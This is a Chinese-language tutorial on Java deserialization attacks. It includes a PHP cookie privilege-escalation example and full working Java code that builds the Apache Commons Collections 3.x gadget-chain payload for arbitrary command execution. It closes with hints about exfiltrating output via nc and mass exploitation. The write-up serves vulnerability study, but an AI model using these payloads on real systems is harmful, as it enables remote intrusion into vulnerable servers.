# 从反序列化到命令执行 - Java 中的 POP 执行链

0x00 前言
=====

作为一名不会 Java %!@#&，仅以此文记录下对 Java 反序列化利用的学习和研究过程。

0x01 什么是序列化
=====

序列化常用于将程序运行时的对象状态以二进制的形式存储于文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。简单的说就是可以基于序列化数据实时在两个程序中传递程序对象。

**1.Java 序列化示例**

![p1](http://drops.javaweb.org/uploads/images/94c180bc1a1018686140eff2c13e41b55b4eea9b.jpg)

上面是一段简单的 Java 反序列化应用的示例。在第一段代码里面，程序将实例对象`String("This is String object!")`通过`ObjectOutputStream`类的`writeObject()`函数写到了文件里。序列化对象在具有一定的二进制结构，以十六进制格式查看存储了序列化对象的文件，除了包含一些字符串常量以外，还能看到其具有不可打印的字符在里面，而这些字符就是用来描述其序列化结构的。（关于序列化格式的相关信息可以参考[官方文档](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130))

**2.Java 序列化特征**

在序列化对象数据中，头4个字节存储的是 Java 序列化对象数据特有的 Magic Number 和相应的协议版本，通常为：

```
0xaced (Magic Number)
0x0005 (Version Number)

```

在具体序列化一个对象时，会遵循序列化协议进行数据封装。扯得有点远了，对 Java 序列化对象数据结构的研究不在本文范围内，官方文档有较为详细的说明，有需要的可以自行查阅。这里我们只需要知道，序列化后的 Java 对象二进制数据通常以`0xaced0005`这 4 个字节开始就可以了。对 Java 应用序列化对象交互的接口寻找就可以通过监测这 4 个特殊字节来进行。

在 Java 里，可以序列化一个对象成为具有一定数据格式的二进制数据，也可以从数据流程中恢复一个实例对象。而进行序列化和反序列化时会使用两个类，如下：

```
// 序列化对象
java.io.ObjectOutputStream
    writeObject()
    writeUnshared()
    ...

// 反序列化对象
java.io.ObjectInputStream
    readObject()
    readUnshared()
    ...

```

当然了，如果开发者对序列化的过程有自己的需求，也可以在对象中重写`writeObject()`和`readObject()`函数，来进行一些特殊的状态和数据的控制。

如果我们需要寻找某个 Java 应用的序列化数据交互接口时，就可以直接进行全局代码搜索序列化和反序列化中常用的那些函数和方法，当找到 Java 应用的序列化数据交互接口后，便可以开始考虑具体的利用方法了。

0x02 反序列化的危害
=====

若你对 Python 或者 PHP 足够熟悉就应该知道在这两个语言中的反序列化过程都能直接导致代码执行或者命令执行，并且 Python 中要想利用反序列化执行命令或者代码基本没有什么条件限制，只要有反序列化的交互接口就能直接执行命令或者代码。当然了，如果做了其他的一些安全策略，就要根据实际情况来分析了。

总结一下在各语言中反序列化过程目前可能带来的危害：

1.  执行逻辑控制（例如变量修改、登陆绕过）
2.  代码执行
3.  命令执行
4.  拒绝服务
5.  ...

这些安全隐患在大多语言的序列化过程出现后就存在了。成功的利用过程大都需要一定的条件和环境，不是每种语言都能像 Python 那样能给直接执行任意命令或者代码，如同一个栈溢出的利用需要考虑各种堆栈防护机制的问题一样。

一旦通过某种方法达到了反序列化漏洞可利用的环境和条件，能够进行利用的点就非常多了。

下面是一段代码是 PHP 代码中将序列化数据以 Cookie 形式存储的实例（user.php）：

```
<?php
class User {
    public $username = '';
    private $is_admin = false;
    function __construct($username) { $this->username = $username; }
    function isAdmin() { return $this->is_admin; }
}   

function initUser() {
    $user = new User('Guest');
    $data = base64_encode(serialize($user));
    setCookie('user', $data, time()+3600);
     echo '<script>location.href="./user.php"</script>';
}   

if(isset($_COOKIE['user'])) {
    $user = unserialize(base64_decode($_COOKIE['user']));
    if($user) {
        if($user->isAdmin()) { echo 'Welcome Come Back, Admninistrator.'; }
        else { echo "Hello, $user->username."; }
    } else {
        initUser();
    }
} else { initUser(); }

```

![p2](http://drops.javaweb.org/uploads/images/75cd683c8bd543d1667aa8980702e7506ace44c8.jpg)

这段代码将用户信息以`base64_encode(serialize($user))`的形式存储于客户端的`$_COOKIE['data']`里，对序列化敏感的都知道可以自己构造序列化内容然后传递给服务端，使其改变代码逻辑。使用下面这段代码生成`$is_admin = true`的用户信息：

```
<?php
class User {
    public $username = 'Guest';
    private $is_admin = true;
}   

echo base64_encode(serialize(new User()));

```

用生成好的 Payload 修改 Cookie 后再次访问即可看到`Welcome Come Back, Admninistrator.`的输出信息。

![p3](http://drops.javaweb.org/uploads/images/799405d9a1c23ee57c4da782e55ea14478d363ae.jpg)

上面这个只是 PHP 中一个简单利用反序列化过程控制代码流程的例子。

Java 中也可以利用反序列化控制代码流程（传播的毕竟是一个对象实例）， 但在 Java 中想要随便反序列化一个类实例是不行的，进行反序列化的类必须显示声明`Serializable`接口，这样才允许进行序列化操作。（具体可以参考[官方文档](http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html)）

0x03 面向属性编程
=====

面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。

**1.基本概念**

在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。

![p4](http://drops.javaweb.org/uploads/images/558facfb8f7daddd5998904368d27020971cffd5.jpg)

从上面这幅图可以知道 ROP 与 POP 极其相似，但 ROP 关注的更为底层，而 POP 只关注上层语言中对象与对象之间的调用关系。

**2. POP 示例**

之前所写的[《unserialize() 实战之 vBulletin 5.x.x 远程代码执行》](http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce.html)就是一个 PHP 中反序列化过程 POP 执行链构造的例子，有兴趣的可以浏览一下，这里就不再给出具体的 POP 示例了。

0x04 Java 反序列化利用
=====

前面讲了这么多也算是自己在研究老外对 Java 反序列化利用时学习和总结出的一些必要知识，下面就来说说从 Java 反序列化到任意命令执行的利用过程。

本年 1 月 AppSec2015 上[@gebl](https://twitter.com/frohoff)和[@frohoff](https://twitter.com/gebl)所讲的[《Marshalling Pickles》](http://frohoff.github.io/appseccali-marshalling-pickles/)提到了基于 Java 的一些通用库或者框架能够构建出一组 POP 链使得 Java 应用在反序列化的过程中触发任意命令执行，同时也给出了相应的 Payload 构造工具[ysoserial](https://github.com/frohoff/ysoserial)。时隔 10 月国外 FoxGlove 安全团队也发表[博文](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)提到一部分流行的 Java 容器和框架使用了可以构造出能够导致任意命令执行 POP 链的通用库，也针对每种受影响的 Java 容器或框架从漏洞发现、分析到具体的利用构造都进行了详细的说明，并在 Github 上放出了相应的[PoC](https://github.com/foxglovesec/JavaUnserializeExploits)。能够成功构造出任意命令执行调用链的通用库和框架如下：

1.  Spring Framework <= 3.0.5，<= 2.0.6；
2.  Groovy < 2.4.4；
3.  Apache Commons Collections <= 3.2.1，<= 4.0.0；
4.  More to come ...

（PS：这些框架或者通用库辅助构造可导致命令执行 POP 链的环境而已，反序列化漏洞的根源是因为不可信的输入和未检测反序列化对象安全性造成的。）

大多讲解和分析 Java 反序列化到任意命令执行的文章中，都提到了 Apache Commons Collections 这个 Java 库，因其 POP 链构造过程在自己学习和研究过程中是最容易理解的一个，所以下面也只分析基于 Apache Commons Collections 3.x 版本的 Gadget 构造过程。

**InvokerTransformer.transform() 反射调用**

在使用 Apache Commons Collections 库进行 Gadget 构造时主要利用了其 Transformer 接口。

```
public interface Transformer {  

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);  

}

```

主要用于将一个对象通过`transform`方法转换为另一个对象，而在库中众多对象转换的接口中存在一个`Invoker`类型的转换接口`InvokerTransformer`，并且同时还实现了`Serializable`接口。

```
public class InvokerTransformer implements Transformer, Serializable {
...省略...
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();  // 反射获取类
            Method method = cls.getMethod(iMethodName, iParamTypes);  // 反射得到具有对应参数的方法
            return method.invoke(input, iArgs);  // 使用对应参数调用方法，并返回相应调用结果
        } catch (NoSuchMethodException ex) {
...省略...

```

可以看到`InvokerTransformer`类中实现的`transform()`接口使用 Java 反射机制获取反射对象`input`中的参数类型为`iParamTypes`的方法`iMethodName`，然后使用对应参数`iArgs`调用获取的方法，并将执行结果返回。由于其实现了`Serializable`接口，因此其中的三个必要参数`iMethodName`、`iParamTypes`和`iArgs`都是可以通过序列化直接构造的，为命令执行创造的决定性的条件。

然后要想利用`InvokerTransformer`类中的`transform()`来达到任意命令执行，还需要一个入口点，使得应用在反序列化的时候能够通过一条调用链来触发`InvokerTransformer`中的`transform()`接口。

然而在 Apache Commons Collections 里确实存在这样的调用，其一是位于`TransformedMap`类中的`checkSetValue()`方法：

```
public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable {
...省略...
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }

```

而`TransformedMap`实现了`Map`接口，而在对字典键值进行`setValue()`操作时会调用`valueTransformer.transform(value)`。

```
...省略...
        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }

```

好的，现在已经找到了反射调用的上一步调用，这里为了多次进行多次反射调用，我们可以将多个`InvokerTransformer`实例级联在一起组成一个`ChainedTransformer`对象，在其调用的时候会进行一个级联`transform()`调用：

```
public class ChainedTransformer implements Transformer, Serializable {
...省略...
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }

```

现在已经可以造出一个`TransformedMap`实例，在对字典键值进行`setValue()`操作时候调我们构造的`ChainedTransformer`，下面给出示例代码：

```
package exserial.examples;  

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;   

import java.util.HashMap;
import java.util.Map;   

public class SetValueToExec {   

    public static void main(String[] args) throws Exception {
        String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app";
        String[] execArgs = command.split(","); 

        Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class},
                        new Object[] {execArgs}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map tempMap = new HashMap<String, Object>();
        Map<String, Object> exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        exMap.put("1111", "2222");
        for (Map.Entry<String, Object> exMapValue : exMap.entrySet()) {
            exMapValue.setValue(1);
        }
    }
}

```

根据之前的分析，将上面这段代码编译运行后会默认会弹出计算器，对代码详细执行过程有疑惑的可以通过单步调试进行测试：

![p5](http://drops.javaweb.org/uploads/images/bd0766f91b5ca1a97b2bc5c6aad9b5f854b59eaa.jpg)

然后我们现在只是测试了使用`TransformedMap`进行任意命令执行而已，要想在 Java 应用反序列化的过程中触发该过程还需要找到一个类，它能够在反序列化调用`readObject()`的时候调用`TransformedMap`内置类`MapEntry`中的`setValue()`函数，这样才能构成一条完整的 Gadget 调用链。恰好在`sun.reflect.annotation.AnnotationInvocationHandler`类具有`Map`类型的参数，并且在`readObject()`方法中触发了上面所提到的所有条件，其源码如下：

```
private void readObject(java.io.ObjectInputStream s) {
    ...省略...
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
                memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]").setMember(annotationType.members().get(name)));
            }
        }
    }
}

```

可以注意到`memberValue`是`AnnotationInvocationHandler`类中类型声明为`Map<String, Object>`的成员变量，刚好和之前构造的`TransformedMap`类型相符，因此我们可以通过 Java 的反射机制动态的获取`AnnotationInvocationHandler`类，使用精心构造好的`TransformedMap`作为它的实例化参数，然后将实例化的`AnnotationInvocationHandler`进行序列化得到二进制数据，最后传递给具有相应环境的序列化数据交互接口使之触发命令执行的 Gadget，完整代码如下：

```
package exserial.payloads;  

import java.io.ObjectOutputStream;  

import java.util.Map;
import java.util.HashMap;   

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;   

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer; 

import exserial.payloads.utils.Serializables;   

public class Commons1 { 

    public static Object getAnnotationInvocationHandler(String command) throws Exception {
        String[] execArgs = command.split(",");
        Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class},
                        new Object[] {execArgs}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map tempMap = new HashMap();
        tempMap.put("value", "does't matter");
        Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, exMap);    

        return instance;
    }   

    public static void main(String[] args) throws Exception {
        String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app"; 

        Object obj = getAnnotationInvocationHandler(command);
        ObjectOutputStream out = new ObjectOutputStream(System.out);
        out.writeObject(obj);
    }
}

```

最终用一段调用链可以清晰的描述整个命令执行的触发过程：

```
/*
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                AbstractInputCheckedMapDecorator$MapEntry.setValue()
                    TransformedMap.checkSetValue()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()  

    Requires:
        commons-collections <= 3.2.1
*/

```

0x05 总结
=====

由于水平有限，暂时只能笔止于此。要清楚反序列化问题不单单存在于某种语言里，而是目前的大多数实现了序列化接口的语言都没有对反序列化的对象做安全检查，虽然官方都有文档说不要对不可信的输入数据进行反序列化，但是往往一些框架就喜欢使用序列化来方便不同应用或者平台之间对象的传递，这就促使了反序列化漏洞的形成。

基于 Apache Commons Collections 通用库构造远程命令执行的 POP Gadget 只能说是 Java 反序列化漏洞利用中的一枚辅助炮弹而已，如果不从根本上加强反序列化的安全策略，以后还会涌现出更多通用库或者框架的 POP Gadget 能够进行有效的利用。

（最后说说关于回显的问题，由于最后的反射调用是一个级联式的调用，并不允许变量二次使用，所以想要不借助外部直接在当前会话输出执行结果是不可能的（至少我已经尽全力尝试了），最简单的方式当然是在外部服务器上用 nc 或者一些其他服务来获取命令返回的信息，具体怎么把执行结果返回到服务端，日过站的你肯定知道。想批量？Yes，so easy！）

0x06 参考
=====

*   [https://www.youtube.com/watch?v=KSA7vUkXGSg](https://www.youtube.com/watch?v=KSA7vUkXGSg)
*   [http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles](http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles)
*   [http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background)
*   [http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/](http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)
*   [https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html#8130)
*   [http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html](http://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html)
*   [http://www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html](http://www.javaworld.com/article/2072752/the-java-serialization-algorithm-revealed.html)
*   [https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)